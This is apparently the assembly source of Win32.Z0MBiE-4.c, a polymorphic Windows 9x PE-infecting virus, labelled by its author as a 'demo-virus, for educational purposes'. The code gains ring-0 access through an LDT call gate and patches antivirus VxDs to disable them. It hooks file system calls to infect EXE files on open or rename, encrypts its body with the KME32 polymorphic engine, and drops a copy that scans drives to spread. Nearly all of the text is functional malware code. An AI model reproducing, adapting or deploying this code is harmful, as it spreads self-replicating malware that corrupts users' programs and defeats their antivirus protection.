
; Win32.Z0MBiE-4.c
;
; demo-virus, for educational purposes; based on 4.b version.
;
; - PE infector (poly, last section appending)
; - ring0-resident via LDT+SEH, standard on-IFS-call file infecting
; - i-am-here function using io callback
; - kill AV VxDs when entered ring-0 (avp/web)
; - ring3 PE-dropper to improve spreading,
;   dropper is the own code (virii just contains PE headers at startup)
; dropper functions:
; - scan drives for files, and simply access 'em (to infect in ring-0)
;
; engines used: KME32 1.01, KILLAVXD 1.02
;
;                                                      http://z0mbie.cjb.net

include                 z0mbie4c.inc
include                 kme32.int

                        p386
                        model   flat

                        locals  __

                        .data

real_start:             mov     ecx, virsize/4  ; same as poly decriptor
                        push    ecx             ;
                        loop    $-1             ;
                        jmp     pe_entry        ;

                        extrn   ExitProcess:PROC; imports need to test dropper
                        call    ExitProcess

                        .code
start:

; following headers are used to build PE-dropper. 512 bytes at all

                        db      'MZ'            ; mz_id
                        dw      512             ; mz_last512
                        dw      1               ; mz_num512
                        dw      0               ; mz_relnum
                        dw      0               ; mz_hdrsize    (!)
                        dw      0               ; mz_minmem
                        dw      0FFFFh          ; mz_maxmem
                        dw      0FFF0h          ; mz_ss
                        dw      0               ; mz_sp
                        dw      ?               ; mz_csum
                        dw      11Ch            ; mz_ip
                        dw      0FFF0h          ; mz_cs
                        dw      40h             ; mz_relptr
                        dw      ?               ; mz_ovrnum
                        db      0B4h,4Ch,0CDh,21h,32-4 dup (?)
                        dd      00000040h       ; mz_neptr

                        db      'PE',0,0        ; pe_id
                        dw      14Ch            ; pe_cputype
                        dw      1               ; pe_numofobjects
                        dd      ?               ; pe_datetime
                        dd      0               ; pe_cofftableptr
                        dd      0               ; pe_cofftablesize
                        dw      0E0h            ; pe_ntheadersize
                        dw      030Fh           ; pe_exeflags
                        dw      010Bh           ; pe_ntheader_id
                        db      0               ; pe_linkmajor
                        db      0               ; pe_linkminor
                        dd      VIRTSIZE        ; pe_sizeofcode
                        dd      0               ; pe_sizeofinitdata
                        dd      0               ; pe_sizeofuninitdata
                        dd      dropper_entry-IMAGEBASE ; pe_entrypointrva
                        dd      1000h           ; pe_baseofcoderva
                        dd      0               ; pe_baseofdatarva
                        dd      IMAGEBASE       ; pe_imagebase
                        dd      4096            ; pe_objectalign
                        dd      512             ; pe_filealign
                        dw      5               ; pe_osmajor
                        dw      0               ; pe_osminor
                        dw      ?               ; pe_usermajor
                        dw      ?               ; pe_userminor
                        dw      4               ; pe_subsysmajor
                        dw      0               ; pe_subsysminor
                        dd      ?               ; reserved
                        dd      4096+VIRTSIZE   ; pe_imagesize
                        dd      512             ; pe_headersize
                        dd      ?               ; pe_checksum
                        dw      2               ; pe_subsystem (gui)
                        dw      0               ; pe_dllflags
                        dd      65536           ; pe_stackreservesize
                        dd      4096            ; pe_stackcommitsize
                        dd      65536           ; pe_heapreservesize
                        dd      4096            ; pe_heapcommitsize
                        dd      0               ; pe_loaderflags
                        dd      16              ; pe_numofrvaandsizes
                        dd      0,0             ; export
                        dd      import_start-IMAGEBASE ; import
                        dd      import_size
                        dd      16-2 dup (0,0)

                        db      '.VCL    '      ; oe_section_name
                        dd      VIRTSIZE        ; oe_virt_size
                        dd      1000h           ; oe_virt_rva
                        dd      dropper_size    ; oe_phys_size
                        dd      512             ; oe_phys_offs
                        db      12 dup (?)
                        dd      0C0000020h      ; oe_flags

                        db      (512-($-start)) dup (?)

pe_entry:
                        call    pe_main

; return to host
                        db      68h             ; push <xxxxxxxx>
old_eip                 dd      rt
                        ret     virsize

get_base_ebp:           call    $+5
                        pop     ebp
                        sub     ebp, offset $-1-start
rt:                     ret

pe_main:                pusha

; install SEH

                        call    __pop1

                        mov     esp, [esp+8]
                        jmp     __exit

__pop1:                 xor     eax, eax
                        push    dword ptr fs:[eax]
                        mov     fs:[eax], esp

; run ring3 dropper
                        call    ring3main       ; see ring3.inc

; check if alredy resident

                        mov     dx, IO_DX
                        in      al, dx
                        cmp     al, IO_AL
                        je      __exit

; get address of ring0 callgate handler

                        call    __pop2

; ring0 callgate handler
                        pusha
                        push    ds es

                        push    ss
                        pop     ds
                        push    ss
                        pop     es

                        call    install_ring0_stuff

                        pop     es ds
                        popa

                        retf                    ; retf !

__pop2:                 pop     esi             ; ESI <-- ring0 proc

                        push    ebx             ; EBX <-- GDT base
                        sgdt    [esp-2]
                        pop     ebx

                        sldt    ax              ; EAX <- LDT selector (#*8)
                        and     eax, not 111b
                        jz      __exit          ; no LDT?

                        add     ebx, eax        ; EBX <-- LDT descriptor offs

                        mov     edi, [ebx+2-2]  ; EDI <-- LDT.base
                        mov     ah, [ebx+7]
                        mov     al, [ebx+4]
                        shrd    edi, eax, 16

                        fild    qword ptr [edi] ; save descriptor (#0)

                        mov     eax, esi        ; build CallGate
                        cld
                        stosw
                        mov     eax, 1110110000000000b shl 16 + 28h
                        stosd
                        shld    eax, esi, 16
                        stosw

                        db      9Ah             ; call 28:<esi>
                        dd      0               ; unused, any number
                        dw      100b+11b        ; #0, LDT+R3

                        fistp   qword ptr [edi-8]; restore descriptor

; uninstall SEH

__exit:                 pop     dword ptr fs:[0]
                        pop     eax

                        popa
                        ret

install_ring0_stuff:

                        call    Win9X_Patch_AV_VxDs     ; fuckup AV

; allocate memory
                        push    PAGEFIXED + PAGEZEROINIT
                        xor     eax, eax
                        push    eax     ; PhysAddr
                        push    eax     ; maxPhys
                        push    eax     ; minPhys
                        push    eax     ; Align
                        push    eax     ; handle of VM = 0 if PG_SYS
                        push    PG_SYS  ; allocate memory in system area
                        push    virpages; nPages
restvxdc:               VMMcall PageAllocate
                        add     esp, 8*4

                        test    eax, eax
                        jz      __exit

; copy virus to new location

                        call    get_base_ebp
                        mov     esi, ebp
                        xchg    ebp, eax                ; EBP=new location!
                        mov     edi, ebp
                        mov     ecx, virsize
                        cld
                        rep     movsb

; fill uninitialized data with 0s

                        mov     ecx, udatasize
                        xor     eax, eax
                        rep     stosb

; make virus's copy -- all files will be infected with this copy.
; we need it because VxDcalls (CD 20 xxx) will be converted to direct CALLs

                        mov     esi, ebp
                        lea     edi, vircopy x
                        mov     ecx, virsize
                        rep     movsb

                        ; restore previously converted VxDcall
                        lea     edi, (restvxdc-start) + vircopy x
                        mov     ax, 20CDh
                        stosw
                        mov     eax, VMM shl 16 + PageAllocate
                        stosd

; protect memory from ring3-access

                        mov     eax, ebp
                        shr     eax, 12

                        push    PC_STATIC                       ; OR_MASK
                        push    not (PC_WRITEABLE+PC_USER)      ; AND_MASK
                        push    virpages
                        push    eax
                        VMMcall PageModifyPermissions
                        add     esp, 4*4

; install file system handler

                        lea     eax, ifs_handler x
                        push    eax
                        VxDcall IFSMGR, InstallFileSystemApiHook
                        pop     ecx
                        mov     old_ifs_handler_ptr_ptr x, eax

; install io service to provide i-am-here function

                        lea     esi, iocallback x
                        mov     edx, IO_DX
                        VMMcall Install_IO_Handler

; done

__exit:                 ret

; io handler

iocallback:             cmp     edx, IO_DX
                        jne     __exit
                        mov     al, IO_AL
__exit:                 ret

; input:  EDI=file name
; output: EAX=-ext

getext:                 mov     ecx, MAXPATH
                        xor     al, al
                        cld
                        repnz   scasb
                        mov     eax, [edi-5]
                        or      eax, 20202000h
                        neg     eax
                        cmp     eax, -EXT_EXE
                        ret


; IFS handler

ifs_handler:            push    ebp

                        call    get_base_ebp

                        cmp     ifs_handler_entered x, 0
                        jne     __quit
                        inc     ifs_handler_entered x

                        mov     eax, [esp]._function

                        cmp     eax, IFSFN_OPEN
                        je      __my_func
                        cmp     eax, IFSFN_RENAME
                        je      __my_func
                        cmp     eax, IFSFN_FILEATTRIB
                        je      __my_func

__exit:                 dec     ifs_handler_entered x

__quit:                 mov     eax, old_ifs_handler_ptr_ptr x
                        pop     ebp
                        jmp     [eax]

; IFSFN_xxx handler

__my_func:              pusha

                        lea     edi, filename x
                        cld

                        mov     eax, [esp]._drive + 32

                        or      al, al
                        jle     __skip

; build file name
                        add     al, 'A'-1
                        stosb
                        mov     al, ':'
                        stosb

                        mov     eax, [esp]._ioreq_ptr + 32
                        mov     eax, [eax+0Ch]  ; eax <-- filename
                        add     eax, 4          ; skip "

                        push    [esp]._codepage+32 ; BCS_WANSI/BCS_OEM
                        push    MAXPATH-1       ; max name length
                        push    eax             ; uni-str
                        push    edi             ; output-str
                        VxDcall IFSMGR, UniToBCSPath
                        add     esp, 4*4

                        or      edx, edx        ; converted normally?
                        jnz     __skip

                        mov     [edi+eax], dl   ; NUL

                        call    infect_file

__skip:                 popa
                        jmp     __exit

; file infection subroutine
; input: filename variable

infect_file:            pusha

                        call    get_base_ebp

; check file extension
                        lea     edi, filename x
                        call    getext
                        jne     __exit

                        int 3

; open file
                        lea     edx, filename x
                        call    fopen
                        jc      __exit
                        xchg    ebx, eax

                        xor     esi, esi      ; esi = offset for fread/fwrite

; process mz header
                        lea     edx, mz x
                        mov     ecx, size mz
                        call    fread
                        cmp     eax, ecx
                        jne     __close

                        sub     ax, mz.mz_id x
                        cmp     ax, (size mz) - 'ZM'
                        jne     __close

; process pe header
                        mov     esi, mz.mz_neptr x

                        lea     edx, pe x
                        mov     ecx, size pe
                        call    fread
                        cmp     eax, ecx
                        jne     __close

                        xor     eax, pe.pe_id x
                        cmp     eax, (size pe) xor 'EP'
                        jne     __close

                        test    pe.pe_exeflags x, 2000h ; dll?
                        jnz     __close

                        cmp     pe.pe_importtablerva x, 0 ; we will need it
                        je      __close

; check if alredy infected

                        cmp     pe.pe_linkminor x, 13
                        je      __close
                        mov     pe.pe_linkminor x, 13

; kill relocs

                        or      pe.pe_exeflags x, 0001h ; relocs. stripped

; calc last object entry offset

                        movzx   ecx, pe.pe_numofobjects x
                        dec     ecx
                        imul    ecx, size oe
                        mov     esi, mz.mz_neptr x
                        add     esi, 18h
                        movzx   eax, pe.pe_ntheadersize x
                        add     esi, eax
                        add     esi, ecx
                        mov     oe_offs x, esi          ; save

; read last object entry

                        lea     edx, oe x
                        mov     ecx, size oe
                        call    fread

; check if smb trying fuck us

                        mov     eax, oe.oe_virt_size x
                        or      eax, eax
                        jz      __close
                        mov     eax, oe.oe_phys_size x
                        or      eax, eax
                        jz      __close

; align section's sizes

                        mov     eax, oe.oe_phys_size x
                        mov     ecx, pe.pe_filealign x
                        dec     ecx
                        add     eax, ecx
                        not     ecx
                        and     eax, ecx
                        mov     oe.oe_phys_size x, eax

                        mov     eax, oe.oe_virt_size x
                        mov     ecx, pe.pe_objectalign x
                        dec     ecx
                        add     eax, ecx
                        not     ecx
                        and     eax, ecx
                        mov     oe.oe_virt_size x, eax

; esi <-- our file offset

                        mov     esi, oe.oe_phys_offs x
                        add     esi, oe.oe_phys_size x

; process entrypointrva

                        mov     eax, pe.pe_entrypointrva x
                        add     eax, pe.pe_imagebase x
                        mov     old_eip x + (vircopy-start), eax

                        mov     eax, esi
                        sub     eax, oe.oe_phys_offs x
                        add     eax, oe.oe_virt_rva x
                        mov     pe.pe_entrypointrva x, eax

; call KME -- generate polymorphic decryptor

                        push    0               ; flags
                        push    CMD_ALL         ; cmd mask
                        push    REG_ALL-REG_EBP ; reg mask
                        VMMcall Get_System_Time ; randseed
                        push    eax
                        push    31              ; jmps if rnd(X)==0
                        lea     eax, buf_entry x; [output eip]
                        push    eax
                        lea     eax, buf_size x ; [output size]
                        push    eax
                        push    0               ; output filler
                        push    maxbufsize      ; output/max size
                        lea     eax, buf x      ; output buffer
                        push    eax
                        push    pe_entry-start  ; input eip
                        push    virsize         ; input size
                        lea     eax, vircopy x  ; input buffer
                        push    eax
                        call    kme_main
                        jc      __close

; update entrypointrva

                        mov     eax, buf_entry x
                        add     pe.pe_entrypointrva x, eax

; update objectentry

                        mov     eax, buf_size x
                        add     oe.oe_phys_size x, eax
                        add     oe.oe_virt_size x, eax

; update pe header

                        add     pe.pe_sizeofcode x, eax
                        add     pe.pe_imagesize x, eax

; write virus to file

                        lea     edx, buf x
                        mov     ecx, buf_size x
                        call    fwrite

; write modified pe header/1st objentry to file

                        mov     esi, mz.mz_neptr x

                        lea     edx, pe x
                        mov     ecx, size pe
                        call    fwrite

; write last object entry

                        mov     esi, oe_offs x

                        lea     edx, oe x
                        mov     ecx, size oe
                        call    fwrite

; close file/exit

__close:                call    fclose

__exit:                 popa
                        ret

xormsg                  macro   x
                        irpc    c, <x>
                        if      "&c" ne "'"
                        db      not "&c"
                        endif
                        endm
                        endm

xormsg 'пока корень зла сокрыт, оно всесильно. z0mbie.cjb.net'

include                 ring3.inc               ; ring-3 stuff
include                 import.inc
include                 dropcode.inc

include                 r0io.inc                ; ring-0 file io

include                 killavxd.inc

include                 kme32bin.inc

align                   macro   x
                        local   c
                        c       = (($-start+(x-1))and(not (x-1)))-($-start)
                        if      c ne 0
                        db      c dup (90h)
                        endif
                        endm

                        align   4
codeend:
virsize                 equ     codeend-start

                        db      512-(($-start+511) and 511) dup (?)
dropper_size            equ     $-start

old_ifs_handler_ptr_ptr dd      ?
ifs_handler_entered     db      ?

filename                db      MAXPATH dup (?)

mz                      mz_struc ?
pe                      pe_struc ?
oe                      oe_struc ?

oe_offs                 dd      ?

ff                      w32fd   ?

vircopy                 db      virsize dup (0)

maxbufsize              equ     32768

buf_entry               dd      ?
buf_size                dd      ?
buf                     db      maxbufsize dup (0)


                        db      4096-(($-start+4095) and 4095) dup (?)
VIRTSIZE                equ     $-start
udatasize               equ     $-codeend
virpages                equ     ($-start+4095)/4096

                        db      3 dup (13,10)
                        db      '-----------------------',13,10
                        db      'virsize  = '
                        db      virsize/1000 mod 10 + '0'
                        db      virsize/ 100 mod 10 + '0'
                        db      virsize/  10 mod 10 + '0'
                        db      virsize/   1 mod 10 + '0'
                        db      13,10
                        db      'virpages = '
                        if      virpages ge 100
                        db      virpages/ 100 mod 10 + '0'
                        endif
                        db      virpages/  10 mod 10 + '0'
                        db      virpages/   1 mod 10 + '0'
                        db      ' ('
                        if      (virpages*4096/1024) ge 100
                        db      (virpages*4096/1024)/ 100 mod 10 + '0'
                        endif
                        db      (virpages*4096/1024)/  10 mod 10 + '0'
                        db      (virpages*4096/1024)/   1 mod 10 + '0'
                        db      'k)'
                        db      13,10
                        db      '-----------------------',13,10
                        db      3 dup (13,10)

                        end     real_start
